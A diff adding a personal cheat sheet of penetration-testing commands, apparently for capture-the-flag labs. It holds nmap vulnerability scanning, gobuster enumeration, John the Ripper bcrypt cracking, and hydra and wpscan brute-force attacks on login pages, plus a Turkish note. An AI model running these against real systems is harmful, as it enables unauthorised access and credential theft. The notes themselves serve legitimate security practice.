@@ -1,0 +1,13 @@
+ nmap -sV -sC --script vuln -oN  relevant.nmap 10.10.91.198
+
+gobuster dir -o gobuster.txt -u 10.10.91.198 -w /Users/myyagis/Documents/wordlists/directory-list-2.3-medium.txt
+
+john hash.txt --wordlist=/Users/myyagis/Documents/wordlists/rockyou.txt  --format=bcrypt
+
+hydra -l admin -P /Users/myyagis/Documents/wordlists/rockyou.txt 10.10.96.124 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=4tc3eZW8RPWRBjUlNJ6N9lkeYvYk4zCsIXaoGuDaZZI8EEKSli2oMc8IG3gq95%2F%2BNtNUPPc7qhdHcaAcji9B%2F92gGHPcPBXujUOivQn7QeEKjhGDGtdBURGXKiBcfqdj5BP34Nj%2Boqn6c722du14yAZYgG7%2BfZHgVtiNSKawpsLG%2BhgA&__EVENTVALIDATION=0TMDOcGkQSopDwd1B8tFa4Z%2F3bi8GPPpJBPopFwGqIhgcMSUmlhGHRonF6ViLshJxk5wECJIz9bUitmrTTDNMguLMmdAyceVjg%2BCdMo9h%2BQSvSDFv0292xrTPl5ATdqLow%2FOu4YRK8CIZMADrxk42lE0GMpkqUVbH3xCyO4STd5J5Vtg&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
+
+
+WPScan
+wpscan --url {IP}/blog -U 'admin' -P '/home/myyagis/Desktop/rockyou.txt' -- max-threads 50
+--> burada /blog, sayfa uzerinde wordpress nerede kullaniliuyorsa orasi, bu ornekde IP/blog url'inde idi.                
+
